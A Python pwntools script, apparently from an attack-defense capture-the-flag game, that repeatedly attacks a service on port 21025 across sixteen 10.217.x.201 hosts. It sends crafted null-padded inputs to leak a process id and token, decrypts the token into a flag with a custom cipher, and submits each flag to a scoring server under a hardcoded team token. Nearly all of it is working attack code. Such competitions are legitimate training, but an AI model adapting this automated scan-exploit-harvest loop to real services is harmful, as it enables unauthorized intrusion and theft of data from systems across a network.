#!/usr/bin/env python
import sys 
from pwn import *
import time
import requests

def one_by_one(c,portal):
    v2 = portal*2 | (portal/(2**15))
    return chr((ord(c)+v2)%95+32 )


def decrypt(cypher,portal):
    dypher = []
    #for c in cypher[::-1]:
    for c in cypher:
        v2 = portal*2 | portal/(2**15)
#        print v2
        if v2 > 65535:
            v2 &= 65535 
        dypher.append( chr((ord(c)+v2)%95+32))
        portal = v2

    return "".join(dypher)

ip = '10.217.1.201'
port = 21025

while True:

	for i in range(1, 17):
		if i == 6:
			continue
		
		ip = '10.217.' + str(i) + '.201'
		
		try:
			r = remote(ip, port)

			r.sendline("7" + "\x00"*255)
			r.sendline("2" + "\x00"*255)
			r.sendline("3" + "\x00"*255)
			r.sendline("1" + "\x00"*255)
			r.sendline("1" + "\x00"*255)
			r.sendline("7" + "\x00"*255)
			r.sendline("4" + "\x00"*255)
			
			time.sleep(2)

			r.recvuntil("Info] Portal ")
			pid = r.recvuntil(" ")
			pid = pid[:len(pid) - 1]
			print pid 

			r.recvuntil(" Receiving (")
			token = r.recvuntil(")\n")
			token = token[:len(token) - 2]

			print token
			
			r.close()
		
			flag = decrypt(token, int(pid))

			print flag
			r = requests.get("http://10.217.0.100/team/submit_key?token=1d695aa7615cb3d485b3a06c920590a1&key=" + flag)
			print r.content
		except:
			print ip, "failed"
	time.sleep(5)
